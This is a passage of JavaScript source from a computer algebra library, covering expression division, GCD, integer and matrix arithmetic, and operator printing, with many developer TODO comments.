        Expression.callback(new Expression.Event(y.matrix.getDeterminantEventType("inverse").type, y));
      }
      //return new Expression.Matrix(y.matrix.inverse().scale(x));
      return new Expression.Matrix(y.matrix.inverse()).multiply(x);
    }

    if (y.equals(Expression.ZERO)) {
      //TODO: fix?
      throw new TypeError("ArithmeticException");
    }
    if (x.equals(Expression.ZERO)) {
      return Expression.ZERO;
    }
    if (y.equals(Expression.ONE)) {
      return x;
    }
    
    //!!! new (2021-04-05)
    // hack!
    //TODO: remove - ?
    var term = getTerm(y);
    if (term instanceof Expression.Exponentiation && getBase(term) === Expression.E && (getExponent(term) instanceof Expression.ExpressionPolynomialRoot)) {
      //if (Expression.isConstant(term.b.e)) {
        if (getTerm(x) instanceof Expression.Exponentiation && getExponent(getTerm(x)) instanceof Expression.ExpressionPolynomialRoot) {
          if ((x instanceof Expression.Exponentiation || x instanceof Expression.Multiplication) && (y instanceof Expression.Exponentiation || y instanceof Expression.Multiplication)) {
            return getExponent(getTerm(x)).subtract(getExponent(getTerm(y))).exp().multiply(getConstant(x).divide(getConstant(y)));
          }
        }
        if (getExponent(getTerm(y)).isNegative()) {
        return x.multiply(term.inverse()).divide(y.divide(term));
        }
      //}
    }
    //!!!

    //!!! new (21.12.2013)
    if (true) { //TODO: remove hack!
      var e = getConjugate(y);
      if (e != undefined) {
        if (e.equals(Expression.ONE)) {
          //!
          if (Expression.isConstant(y)) {
            return x.multiply(Expression._map(function (x) { return x instanceof NthRoot ? Expression.toPolynomialRoot(x) : x; }, y).inverse());
          }
          //!
          throw new TypeError(); // "assertion"
        }
        //TODO: fix for g+i*g
        if (e instanceof Expression.Multiplication && e.a instanceof Expression.Complex) {
          e = e.a;
        }
        return x.multiply(e).divide(y.multiply(e));
      }
    }

    if (Expression.has(x, Expression.Complex)) {//!new 2017-11-25
      var tmp = Expression.getComplexNumberParts(x);
      if (tmp != undefined && !tmp.imaginary.equals(Expression.ZERO)) {
        var a = tmp.real;
        var b = tmp.imaginary;
        var g = (a.equals(Expression.ZERO) ? y : a.gcd(y)).gcd(b)._abs();
        if (!g.equals(Expression.ONE)) {
          x = a.divide(g).add(b.divide(g).multiply(Expression.I));
          y = y.divide(g);
        }
        if (y.isNegative()) {
          x = x.negate();
          y = y.negate();
        }
        return y.equals(Expression.ONE) ? x : new Division(x, y);
      }
    }//!

    //!2020-06-07
    if (!getConstant(y).equals(y) && x.divide(getConstant(x)).equals(y.divide(getConstant(y)))) {
      return getConstant(x).divide(getConstant(y));
    }

    // check if y is instance of Integer to avoid issues with nth-roots (?) - see a test
    //TODO: investigate
    var v = y instanceof Integer ? undefined : getVariable(x);//???
    //var v = getVariable(x);//???
    //TODO: move?

    if (has(v, MatrixSymbol) && isScalar(y)) {//TODO: fix ?
      v = getVariable(y);
    }

    //!2019-06-16
    if (v != null) { // e**(1/2)
      var originalVariable = v;
      v = getVariable(v);
      var r = getReplacement(y, getReplacement(x, v, originalVariable), originalVariable);
      if (r instanceof Replacement) {
        //debugger;
        var a = r.apply(x);
        var b = r.apply(y);
        var c = a.divide(b);
        var n = r.undo(c.getNumerator());
        var d = r.undo(c.getDenominator());
        //debugger;
        return d.equals(Expression.ONE) ? n : new Expression.Division(n, d);
      }
      if (!r.equals(v)) {
        var ir = inverseReplacement(r, v);
        var a = substitute(x, v, r, ir);
        var b = substitute(y, v, r, ir);
        //console.log(a + ' ' + b);
        var t = a.divide(b);
        a = substitute(t.getNumerator(), v, ir, r);
        b = substitute(t.getDenominator(), v, ir, r);
        return b.equals(Expression.ONE) ? a : new Expression.Division(a, b);
      }
    }


    // gcd
    var px = undefined;
    var py = undefined;
    if (v != undefined) {
      px = Polynomial.toPolynomial(x, v);
      py = Polynomial.toPolynomial(y, v);
      if (px.getDegree() === 0 && py.getDegree() === 0) {
        v = undefined;
      }
    }
    if (v == undefined) {
      var g = complexGCD(getConstant(x, true), getConstant(y, true));
      if (!g.equals(Expression.ONE)) {
        x = divideByInteger(x, g);
        y = divideByInteger(y, g);
        return x.divide(y);
      }
    } else {
      //!TODO: remove - performance optimization
      var t = px.divideAndRemainder(py, "undefined");
      if (t != undefined && t.remainder.equals(Polynomial.ZERO)) {
        return t.quotient.calcAt(v);
      }
      //!
      var g = Polynomial.polynomialGCD(px, py);
      if (g.getDegree() !== 0 || !g.getLeadingCoefficient().equals(Expression.ONE)) { // g !== 1
        var x2 = px.divideAndRemainder(g, "throw").quotient;
        var y2 = py.divideAndRemainder(g, "throw").quotient;
        return x2.calcAt(v).divide(y2.calcAt(v));
      }
    }

    //var lc = getConstant(getLeadingCoefficient(y, v));
    //var lc = getConstant(getLeadingCoefficient(y, getVariable(y)));
    var lc = getConstant(getFirstAdditionOperand(y));
    if (lc.compareTo(Expression.ZERO) < 0) {
      return x.negate().divide(y.negate());
    }
    if (has(y, MatrixSymbol)) {//?
      return new Expression.Multiplication(x, new Expression.Exponentiation(y, Expression.ONE.negate()));//?
    }//?
    return new Division(x, y);
  };

  function Expression() {
    throw new TypeError("Do not call for better performance");
  }

  Expression.callback = undefined;
  Expression.Event = function (type, data, second) {
    second = second == undefined ? undefined : second;
    this.type = type;
    this.data = data;
    this.second = second;
  };

  Expression.prototype.compare4Multiplication = function (y) {
    throw new TypeError(this.toString());
  };
  Expression.prototype.compare4MultiplicationInteger = function (x) {
    throw new TypeError();
  };
  Expression.prototype.compare4MultiplicationSymbol = function (x) {
    throw new TypeError();
  };
  Expression.prototype.compare4MultiplicationNthRoot = function (x) {
    throw new TypeError();
  };

  Expression.prototype.negate = function () {
    return Expression.ONE.negate().multiply(this);
  };
  Expression.prototype.add = function (y) {
    return y.addExpression(this);
  };
  Expression.prototype.subtract = function (y) {
    return this.add(y.negate());
  };
  Expression.prototype.divide = function (y) {
    //!2019-04-22
    if (!(y instanceof Expression.Matrix)) {
      if (this.equals(y)) { //!TODO: remove - a hack to avoid some exceptions
        //if (this instanceof IdentityMatrix) {
        //  return this;
        //}
        return Expression.ONE;
      }
      if (this.equals(y.negate())) {
        return Expression.ONE.negate();
      }
    }
    return y.divideExpression(this);
  };
  Expression.prototype.multiply = function (y) {
    return y.multiplyExpression(this);
  };
  Expression.prototype.pow = function (y) {
    return y.powExpression(this);
  };
  Expression.prototype.getDenominator = function () {
    //TODO: FIX!!!!
    return this instanceof Division ? this.b : Expression.ONE;
  };
  Expression.prototype.getNumerator = function () {
    //TODO: FIX!!!!
    return this instanceof Division ? this.a : this;
  };
  Expression.prototype.inverse = function () {
    return Expression.ONE.divide(this);
  };
  Expression.prototype.exp = function () {
    return Expression.E.pow(this);
  };


  //TODO: use in Expression#getCoefficients -?
  var variables = function (e) {
    var result = [];
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        for (var iteratorve = getVariableInternal(y)[globalThis.Symbol.iterator](), ve = iteratorve.next().value; ve != null; ve = iteratorve.next().value) {
          if (!(ve.v instanceof Integer)) {
            result.push(ve.v);
          }
        }
      }
    }
    return result;
  };

  //TODO: remove - performance optimization
  var getCommonVariable = function (x, y) {
    var a = variables(x);
    var b = variables(y);
    for (var i = 0; i < a.length; i += 1) {
      if (a[i] instanceof NthRoot) {
        return a[i];
      }
    }
    for (var i = 0; i < b.length; i += 1) {
      if (b[i] instanceof NthRoot) {
        return b[i];
      }
    }
    for (var i = 0; i < a.length; i += 1) {
      if (a[i] instanceof Addition) {
        //return variables(a[i])[0];//TODO: fix
        a = a.concat(variables(a[i]));
        a[i] = null;
      }
    }
    for (var i = 0; i < b.length; i += 1) {
      if (b[i] instanceof Addition) {
        //return variables(b[i])[0];//TODO: fix
        b = b.concat(variables(b[i]));
        b[i] = null;
      }
    }
    for (var i = 0; i < a.length; i += 1) {
      for (var j = 0; j < b.length; j += 1) {
        if (a[i] != null && b[j] != null) {
        if (a[i].equals(b[j])) {
          return a[i];
        }
        }
      }
    }
    return null;
  };

  // TODO: fix or remove ?
  Expression.prototype.gcd = function (x) {
    if (this.equals(Expression.ONE)) {
      return this;
    }
    //if (this.equals(x)) {
      //return this;//?
    //}
    if (this instanceof Integer && x instanceof Integer) {
      return integerGCD(this, x);//performance
    }
    if (!(this instanceof Integer) && !(x instanceof Integer)) {
    //TODO: fix
    //return gcd(this, x, getVariable(this) || getVariable(x));
    //TODO: remove this block (a workaround for buggy gcd)
    var t1 = getTerm(this);
    var t2 = getTerm(x);
    if (t1 != null && t2 != null && t1.equals(t2)) {
      return getConstant(this).gcd(getConstant(x)).multiply(t2);
    }
    //!2020-11-05 more workarounds:
    t1 = getTerm(getFirstAdditionOperand(this));
    t2 = getTerm(getFirstAdditionOperand(x));
    if (t1 != null && t2 != null && t1.equals(t2)) {
      var c1 = getConstant(getFirstAdditionOperand(this));
      var c2 = getConstant(getFirstAdditionOperand(x));
      if (c1 instanceof Integer && c2 instanceof Integer) {
        var alpha = c1.truncatingDivide(c2);
        if (alpha instanceof Expression.Integer && alpha.multiply(c2).equals(c1)) {
          return this.subtract(x.multiply(alpha)).gcd(x);
        }
        var alpha = c2.truncatingDivide(c1);
        if (alpha instanceof Expression.Integer && alpha.multiply(c1).equals(c2)) {
          return this.gcd(x.subtract(this.multiply(alpha)));
        }
      }
    }
    }
    if (this.equals(Expression.ZERO) || x.equals(Expression.ZERO)) {
      return this.add(x);
    }
    //!
    var result = gcd(this, x, getCommonVariable(this, x));
    return result;
  };
  // Least common multiple
  Expression.prototype.lcm = function (x) {
    if (x.equals(Expression.ONE)) {
      return this;//performance
    }
    return this.divide(this.gcd(x)).multiply(x);
  };

  //!new 2020-07-21
  Expression.prototype.polynomialGCD = function (b) {
    var a = this;

    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(a))).next().value.v; // avoid square roots
    if (v instanceof Expression.Symbol) {
      var r = getReplacement(a, getReplacement(b, v));
      if (!r.equals(v)) {
        return substitute(substitute(a, v, r, inverseReplacement(r, v)).polynomialGCD(substitute(b, v, r, inverseReplacement(r, v))), v, inverseReplacement(r, v), r);
      }

      return Polynomial.polynomialGCD(Polynomial.toPolynomial(a, v), Polynomial.toPolynomial(b, v)).calcAt(v);
    }
    return a.gcd(b);//?
  };

  //TODO: merge with ExpressionParser.js ?!?
  var precedence = {
    binary: {
      ".^": 5,
      "^": 5,
      "*": 3,
      "/": 3,
      "+": 2,
      "-": 2
    },
    unary: {
      "-": 5//HACK
    }
  };

  var Symbol = null;

  Expression.Symbol = function (symbol) {
    //Expression.call(this);
    this.symbol = symbol;
  };

  Expression.Symbol.prototype = Object.create(Expression.prototype);

  Expression.Symbol.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationSymbol(this);
  };
  Expression.Symbol.prototype.compare4MultiplicationInteger = function (x) {
    return -1;
  };
  Expression.Symbol.prototype.compare4MultiplicationSymbol = function (x) {
    return x.symbol < this.symbol ? -1 : (this.symbol < x.symbol ? +1 : 0);
  };
  Expression.Symbol.prototype.compare4MultiplicationNthRoot = function (x) {
    return -1;
  };

  Expression.Symbol.prototype.toString = function (options) {
    if (this.symbol === '\u2147') {
      return 'e';//!
    }
    return this.symbol;
  };

  Expression.Symbol.prototype._pow = function (count) {
    if (count > 1) {
      return new Expression.Exponentiation(this, Expression.Integer.fromNumber(count));
    }
    return Expression.prototype._pow.call(this, count);
  };

  Expression.prototype.addInteger = function (x) {
    return this.addExpression(x);
  };
  Expression.prototype.multiplyInteger = function (x) {
    if (x === Expression.ONE) {
      return this;
    }
    return this.multiplyExpression(x);
  };
  Expression.prototype.divideInteger = function (x) {
    return this.divideExpression(x);
  };

  var simplifyIdentityMatrixPower = true; //! TODO:

  function Integer(value) {
    //Expression.call(this);
    this.value = value;
  }

  Integer.prototype = Object.create(Expression.prototype);

  Integer.prototype.powExpression = function (x) {
    var y = this;
    if (x instanceof IdentityMatrix) {
      if (simplifyIdentityMatrixPower) {
        return new IdentityMatrix(x.symbol);
      }
    }
    if (x instanceof MatrixSymbol) {
      if (y.equals(Expression.ZERO)) {
        return Expression.ONE;
      }
      if (y.equals(Expression.ONE)) {
        return x;
      }
      return new Exponentiation(x, y);//?
    }
    //!new 2019-12-16
    if (x instanceof Exponentiation && getExponent(x) instanceof Integer && y instanceof Integer) {//? (X**2)**(-1)
      return getBase(x).pow(getExponent(x).multiply(y));
    }
    //!
    //!new 2020-03-02
    if (x instanceof Exponentiation && getTerm(getExponent(x)) instanceof Expression.Symbol) {//? (X**2)**(-1)
      return getBase(x).pow(getExponent(x).multiply(y));
    }
    //!

    if (y.compareTo(Expression.ZERO) < 0) {
      return Expression.ONE.divide(x.pow(y.negate()));
    }
    if (x instanceof Expression.Matrix) {
      if (y.compareTo(Expression.ONE) > 0) {
        if (!x.matrix.isDiagonal()) {
          if (Expression.callback != undefined) {
            Expression.callback(new Expression.Event("pow", x, new Expression.Matrix(Matrix.I(1).map(function () { return y; }))));
          }
        }
      }
      var powMatrix = function (matrix, n) {
        if (n.toNumber() > Number.MAX_SAFE_INTEGER) {
          return powMatrix(matrix, n.truncatingDivide(Expression.TWO)).pow(2).multiply(matrix.pow(n.remainder(Expression.TWO).toNumber()));
        }
        return matrix.pow(n.toNumber());
      };
      return new Expression.Matrix(powMatrix(x.matrix, y));
    }
    if (y.equals(Expression.ZERO)) {
      return Expression.ONE;
    }
    if (y.equals(Expression.ONE)) {
      return x;
    }

    if (x instanceof Expression.Symbol) {
      return new Exponentiation(x, y);
    }
    if (x instanceof Exponentiation) {
      var t = x.b.multiply(y);
      if (t.getNumerator() instanceof Integer && t.getDenominator() instanceof Integer) {//TODO: ?
        var i = t.getNumerator().truncatingDivide(t.getDenominator());
        if (i.compareTo(Expression.ZERO) > 0) {
          return x.a.pow(i).multiply(x.a.pow(t.subtract(i)));
        }
      }
      return x.a.pow(x.b.multiply(y));
    }
    if (x instanceof Integer && (x.compareTo(Expression.ZERO) === 0 || x.compareTo(Expression.ONE) === 0 || x.compareTo(Expression.ONE.negate()) === 0)) {
      return y.remainder(Expression.TWO).compareTo(Expression.ZERO) === 0 ? x.multiply(x) : x;
    }
    if (x.equals(Expression.I)) {
      y = y.remainder(Expression.TWO.add(Expression.TWO));
      return Expression.pow(x, y.toNumber());
    }
    // assert(x instanceof Operation || x instanceof Integer);
    return Expression.pow(x, y.toNumber());
  };

  Integer.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationInteger(this);
  };
  Integer.prototype.compare4MultiplicationInteger = function (x) {
    return x.compareTo(this);
    //return 0;
  };
  Integer.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  Integer.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };

  Integer.prototype.negate = function () {
    return new Integer(SmallBigInt.unaryMinus(this.value));
  };
  Integer.prototype.isUnit = function () {
    return this.equals(Expression.ONE) || this.equals(Expression.ONE.negate());
  };
  Expression.prototype.toExpression = function () {
    return this;
  };
  Integer.prototype.compareTo = function (y) {
    if (y instanceof Expression.Integer) {
      var b = y.value;
      var a = this.value;
      return SmallBigInt.lessThan(a, b) ? -1 : (SmallBigInt.lessThan(b, a) ? +1 : 0);
    }
    return Expression.prototype.compareTo.call(this, y);
  };
  Integer.prototype.abs = function () {
    return SmallBigInt.toNumber(this.value) < 0 ? this.negate() : this;
  };
  Integer.prototype.sign = function () {
    return Math.sign(SmallBigInt.toNumber(this.value));
  };
  Integer.prototype.add = function (y) {
    if (this === Expression.ZERO) {
      return y;
    }
    return y.addInteger(this);
  };
  Integer.prototype.addInteger = function (x) {
    return new Integer(SmallBigInt.add(x.value, this.value));
  };
  Integer.prototype.multiply = function (y) {
    return y.multiplyInteger(this);
  };
  Integer.prototype.multiplyInteger = function (x) {
    if (x === Expression.ONE) {
      return this;
    }
    return new Integer(SmallBigInt.multiply(x.value, this.value));
  };
  Integer.prototype.divide = function (y) {
    return y.divideInteger(this);
  };
  //! for performance only
  Integer.prototype.divideInteger = function (x) {
    var y = this;
    var a = x.value;
    var b = y.value;
    //if (a == b) { // for performance
    //  return Expression.ONE;
    //}
    if (SmallBigInt.toNumber(b) === 0) {
      //TODO: fix?
      throw new TypeError("ArithmeticException");
    }
    if (typeof b === "number" && b === 1) {
      return x;//!!!
    }
    var q = SmallBigInt.divide(a, b);
    var r = SmallBigInt.subtract(a, SmallBigInt.multiply(q, b));
    if (SmallBigInt.toNumber(r) === 0) {
      return new Integer(q);
    }
    var g = SmallBigInt.BigInt(bigIntGCDWrapper(r, b));
    //if (BigInteger.notEqual(g, Expression.ONE.value)) {
      a = SmallBigInt.divide(a, g);
      b = SmallBigInt.divide(b, g);
    //}
    if (SmallBigInt.toNumber(b) < 0) {
      a = SmallBigInt.unaryMinus(a);
      b = SmallBigInt.unaryMinus(b);
    }
    return /*BigInteger.equal(b, Expression.ONE.value) ? new Integer(a) : */new Division(new Integer(a), new Integer(b));
  };
  Integer.prototype.truncatingDivide = function (y) {
    if (y.equals(Expression.ONE)) {
      return this;
    }
    return y.truncatingDivideInteger(this);
  };
  Integer.prototype.truncatingDivideInteger = function (x) {
    var y = this;
    return new Integer(SmallBigInt.divide(x.value, y.value));
  };
  Integer.prototype.isDivisibleBy = function (y) {
    return y.isDivisibleByInteger(this);
  };
  Integer.prototype.isDivisibleByInteger = function (x) {
    return x.remainder(this).equals(Expression.ZERO);
  };
  Integer.prototype.remainder = function (y) {
    return y.remainderInteger(this);
  };
  Integer.prototype.remainderInteger = function (x) {
    var y = this;
    var r = SmallBigInt.remainder(x.value, y.value);
    return r === 1 ? Expression.ONE : new Integer(r);
  };
  Integer.prototype.primeFactor = function () {
    return integerPrimeFactor(this);
  };
  Integer.prototype.toNumber = function () {
    return SmallBigInt.toNumber(this.value);
  };
  Integer.prototype.toBigInt = function () {
    return this.value;
  };
  Integer.prototype.toString = function (options) {
    return this.value.toString();
  };
  Integer.prototype.valueOf = function () {
    console.error("!");
    //throw new TypeError("");
    return this;
  };
  Integer.prototype.leftShift = function (n) {
    return new Integer(SmallBigInt.leftShift(this.value, n));
  };

  Integer.fromNumber = function (n) {
    return new Integer(SmallBigInt.BigInt(n));
  };
  Integer.fromString = function (s) {
    return new Integer(SmallBigInt.BigInt(s));
  };
  Integer.fromBigInt = function (i) {
    return new Integer(SmallBigInt.BigInt(i));
  };

  Expression.ZERO = Integer.fromNumber(0);
  Expression.ONE = Integer.fromNumber(1);
  Expression.TWO = Integer.fromNumber(2);
  Expression.TEN = Integer.fromNumber(10);

  Expression.Matrix = function (matrix) {
    //Expression.call(this);
    this.matrix = matrix;
  };

  Expression.Matrix.fromArray = function (rows) {
    return new Expression.Matrix(Matrix.padRows(rows, null));
  };

  Expression.Matrix.prototype = Object.create(Expression.prototype);

  Expression.Matrix.prototype.augment = function (other) {
    if (other instanceof Expression.IdentityMatrix) {
      return new Expression.Matrix(this.matrix.augment(Matrix.I(this.matrix.cols())));
    }
    return new Expression.Matrix(this.matrix.augment(other.matrix));
  };

  Expression.Matrix.prototype.equals = function (x) {
    //!new 2019-12-03
    if (x === Expression.ZERO) {
      return this.matrix.isSquare() && this.matrix.eql(this.matrix.map(function (e, i, j) {
        return Expression.ZERO;
      }));
    }
    //!
    if (!(x instanceof Expression.Matrix)) {
      return false;
    }
    return this.matrix.eql(x.matrix);
  };

  Expression.Matrix.prototype.compare4Multiplication = function (y) {
    if (y instanceof Expression.Matrix) {
      return 0;
    }
    if (y instanceof MatrixSymbol) {
      // https://math.stackexchange.com/a/1698005/116680
      if (this.matrix.isSquare() && this.matrix.isDiagonal()) {//?
        var element = this.matrix.e(0, 0);
        if (this.matrix.eql(Matrix.Zero(this.matrix.rows(), this.matrix.cols()).map(function (e, i, j) { return i === j ? element : Expression.ZERO; }))) {
          return +1;
        }
      }
      return -1;
    }
    return +1;
  };
  Expression.Matrix.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };

  Expression.Matrix.prototype.multiply = function (y) {
    return y.multiplyMatrix(this);
  };
  Expression.prototype.multiplyMatrix = function (x) {
    var t = getIdentityMatrixCoefficient(this);
    if (t != undefined) {
      return new Expression.Matrix(x.matrix.scale(t));
    }
    if (x.equals(Expression.ZERO)) {//!TODO: TEST, TODO: sizes are lost
      return x;
    }
    return this.multiplyExpression(x);
  };
  Expression.Matrix.prototype.multiplyExpression = function (x) {
    var t = getIdentityMatrixCoefficient(x);
    if (t != undefined) {
      return new Expression.Matrix(this.matrix.scale(t));
    }
    return Expression.prototype.multiplyExpression.call(this, x);
  };
  Expression.Matrix.prototype.multiplyMatrix = function (x) {
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("multiply", x, this));
    }
    return new Expression.Matrix(x.matrix.multiply(this.matrix));
  };
  Expression.Matrix.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  Expression.Matrix.prototype.multiplyDivision = Expression.Matrix.prototype.multiplyExpression;
  Expression.Matrix.prototype.add = function (y) {
    return y.addMatrix(this);
  };
  Expression.Matrix.prototype.addMatrix = function (x) {
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("add", x, this));
    }
    return new Expression.Matrix(x.matrix.add(this.matrix));
  };

  var isScalar = function (x) {
    if (x instanceof Integer) {
      return true;
    }
    if (x instanceof Expression.Complex) {
      return true;
    }
    if (x instanceof MatrixSymbol) {
      return false;
    }
    if (x instanceof Expression.ExpressionWithPolynomialRoot) {
      return isScalar(x.e);
    }
    if (x instanceof Expression.Symbol) {
      return true;
    }
    if (x instanceof BinaryOperation) {
      return isScalar(x.a) && isScalar(x.b);
    }
    if (x instanceof Negation) {
      return isScalar(x.b);
    }
    if (x instanceof Expression.Function) {
      return isScalar(x.a);
    }
    if (x instanceof Expression.NonSimplifiedExpression) {//TODO: ?
      return isScalar(x.unwrap());
    }
    return false;//?
  };

  Expression.isScalar = isScalar;

  var getIdentityMatrixCoefficient = function (x) {
    var t = undefined;
    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      t = x.a;
    } else if (x instanceof IdentityMatrix) {
      t = Expression.ONE;
    } else if (isScalar(x)) {
      t = x;
    } else if (x instanceof Addition) {
      if (Expression.has(x, IdentityMatrix)) {//TODO: fix
        var ca = getIdentityMatrixCoefficient(x.a);
        var cb = getIdentityMatrixCoefficient(x.b);
        if (ca != undefined && cb != undefined) {
          t = ca.add(cb);
        }
      }
    }
    return t;
  };

  Expression.prototype.addMatrix = function (x) {
    var t = getIdentityMatrixCoefficient(this);
    if (t != undefined) {
      //?
      if (x.matrix.isSquare()) {
        return new Expression.Matrix(Matrix.I(x.matrix.rows()).scale(t)).add(x);
      } else {
        throw new RangeError("NonSquareMatrixException");
      }
    }
    return this.addExpression(x);
  };
  Expression.Matrix.prototype.addExpression = function (x) {
    var t = getIdentityMatrixCoefficient(x);
    if (t != undefined) {
      //?
      if (this.matrix.isSquare()) {
        return this.add(new Expression.Matrix(Matrix.I(this.matrix.rows()).scale(t)));
      } else {
        throw new RangeError("NonSquareMatrixException");
      }
    }
    return Expression.prototype.addExpression.call(this, x);
  };

  Expression.Matrix.prototype.toString = function (options) {
    return this.matrix.toString(setTopLevel(true, options));
  };

  Expression.Matrix.prototype.isExact = function () {
    return this.matrix.isExact();
  };

  function BinaryOperation(a, b) {
    //Expression.call(this);
    this.a = a;
    this.b = b;
  }

  BinaryOperation.prototype = Object.create(Expression.prototype);

  BinaryOperation.prototype.isNegation = function () {
    // TODO: What about NonSimplifiedExpression(s) ?
    //if (this instanceof Multiplication && this.a instanceof NonSimplifiedExpression && this.a.e instanceof Integer && this.a.e.equals(Expression.ONE.negate())) {
    //  return true;
    //}
    return (this instanceof Multiplication && this.a instanceof Integer && this.a.equals(Expression.ONE.negate()));
  };

  var setTopLevel = function (isTopLevel, options) {
    return options == undefined ? {isTopLevel: isTopLevel} : Object.assign({}, options, {isTopLevel: isTopLevel});
  };

  Expression.setTopLevel = setTopLevel;

  BinaryOperation.prototype.toString = function (options) {
    //if (this instanceof Division && this.isNegative()) {
    //  return '-' + this.negateCarefully().toString(options);
    //}
    var a = this.a;
    var b = this.b;
    var isSubtraction = false;
    // TODO: check
    /*
    if (Expression.simplification && this instanceof Addition && a.isNegative()) {
      var tmp = b;
      b = a;
      a = tmp;
    }*/

    if (this instanceof Addition && b.isNegative()) {
      isSubtraction = true;
      b = b.negateCarefully();//?
    }
    var fa = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();
    var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
    if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
      fa = fa || a.isUnaryPlusMinus();
    }
    fb = fb || b.isUnaryPlusMinus(); // 1*-3 -> 1*(-3)
    fb = fb || (this.unwrap() instanceof Exponentiation && b.unwrap() instanceof Exponentiation); // 2^3^4
    fa = fa || (this.unwrap() instanceof Exponentiation && a.unwrap() instanceof Expression.Function); // cos(x)^(2+3)
    var s = isSubtraction ? "-" : this.getS();
    //TODO: fix spaces (matrix parsing)
    if (this.isNegation()) {
      // assert(fa === false);
      return "-" + (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
    }
    return (fa ? "(" : "") + a.toString(setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? ")" : "") +
           s +
           (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
  };

  //?
  Expression.prototype.unwrap = function () {
    return this;
  };

  function Exponentiation(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Exponentiation.prototype = Object.create(BinaryOperation.prototype);

  //TODO: remove - ?
  Exponentiation.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationExponentiation(this);
  };
  Exponentiation.prototype.compare4MultiplicationInteger = function (x) {
    return -1;
  };

  Exponentiation.prototype.compare4MultiplicationExponentiation = function (x) {
    var y = this;
    return getBase(x).compare4Multiplication(getBase(y)) || getExponent(x).compare4Multiplication(getExponent(y));
  };
  BinaryOperation.prototype.compare4MultiplicationExponentiation = function () {
    return -1;//TODO: !?
  };

  function Multiplication(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Multiplication.prototype = Object.create(BinaryOperation.prototype);

  Multiplication.prototype.multiply = function (y) {
    return y.multiplyExpression(this);
  };
  //TODO:
  var compare4Multiplication2 = function (x, y) {//TODO: fix

//  && x.n !== y.n
    if (x instanceof NthRoot && y instanceof NthRoot) {//TODO: fix
      var test = x.multiply(y);
      // instanceof is needeed to avoid ExpressionWithPolynomialRoot#equals, which cause an infinite loop
      if (test instanceof Expression.Multiplication) {
        if (test.equals(new Expression.Multiplication(x, y))) {
          return -1;
        }
        if (test.equals(new Expression.Multiplication(y, x))) {
          return +1;
        }
      }
      return 0;
    }
/*
    //!2019-04-22
    if (x instanceof NthRoot && y instanceof NthRoot && x.n === y.n) {//TODO: fix
      if (x.a instanceof Integer && y.a instanceof Integer) {
        return 0;
      }
      if (x.a instanceof Addition && y.a instanceof Integer) {
        return 0;//TODO: fix
      }
      if (x.a instanceof Integer && y.a instanceof Addition) {
        return 0;//TODO: fix
      }
      // -(2^0.5+1)^0.5*(2*2^0.5+2)^0.5
      if (x.a instanceof Addition && y.a instanceof Addition) {
        return 0;//TODO: fix
      }
      // 3 and 3^n
      return compare4Multiplication(x.a, y.a);
    }
  */
    if (x instanceof Integer && y instanceof Exponentiation) {
      return -1;//?
    }
    if (x instanceof Exponentiation && y instanceof Integer) {
      return +1;//?
    }
    if (x instanceof Expression.Complex && y instanceof Exponentiation) {
      return -1;//?
    }
    if (x instanceof Exponentiation && y instanceof Expression.Complex) {
      return +1;//?
    }

    return compare4Multiplication(getBase(x), getBase(y));
  };

  function Negation(b) {
    //Expression.call(this);
    this.b = b;
  }

  Negation.prototype = Object.create(Expression.prototype);

  Expression.prototype.equalsNegation = function (x) {
    return false;
  };
  Negation.prototype.equalsNegation = function (b) {
    return this.b.equals(b.b);
  };
  Negation.prototype.equals = function (b) {
    return b.equalsNegation();
  };
  Negation.prototype.toString = function (options) {
    var b = this.b;
    var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
    fb = fb || b.isUnaryPlusMinus();
    // assert(fa === false);
    return "-" + (fb ? "(" : "") + b.toString(setTopLevel(fb, options)) + (fb ? ")" : "");
  };

  function Subtraction(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Subtraction.prototype = Object.create(BinaryOperation.prototype);

  Subtraction.prototype.getS = function () {
    return "-";
  };

  //

  function Addition(a, b) {
    BinaryOperation.call(this, a, b);
  }

  Addition.prototype = Object.create(BinaryOperation.prototype);
  Addition.prototype.multiply = function (y) {
    return y.multiplyAddition(this);
  };
  var _multiplyAddition = function (value, addition, fromLeft) {
    // optimization (to avoid stack overflow when addition has a lot of summands (?))
    var result = [];
    for (var iterators = addition.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
      var v = fromLeft ? value.multiply(s) : s.multiply(value);
      result.push(v);
    }
    return _sum(result);
  };
  var _sum = function (summands) {
    var k = summands.length;
    if (k === 0) {
      return Expression.ZERO;
    }
    while (k > 1) {
      for (var i = 0; 2 * i < k; i += 1) {
        summands[i] = 2 * i + 1 < k ? summands[2 * i + 1].add(summands[2 * i]) : summands[2 * i];
      }
      k = Math.ceil(k / 2);
    }
    return summands[0];
  };
  Expression.prototype.multiplyAddition = function (x) {
    return _multiplyAddition(this, x, false);
    //return x.a.multiply(this).add(x.b.multiply(this));
  };
  Addition.prototype.multiplyExpression = function (x) {
    return _multiplyAddition(x, this, true);
    //return x.multiply(this.a).add(x.multiply(this.b));
  };

  function Division(a, b) {
    BinaryOperation.call(this, a, b);
  }

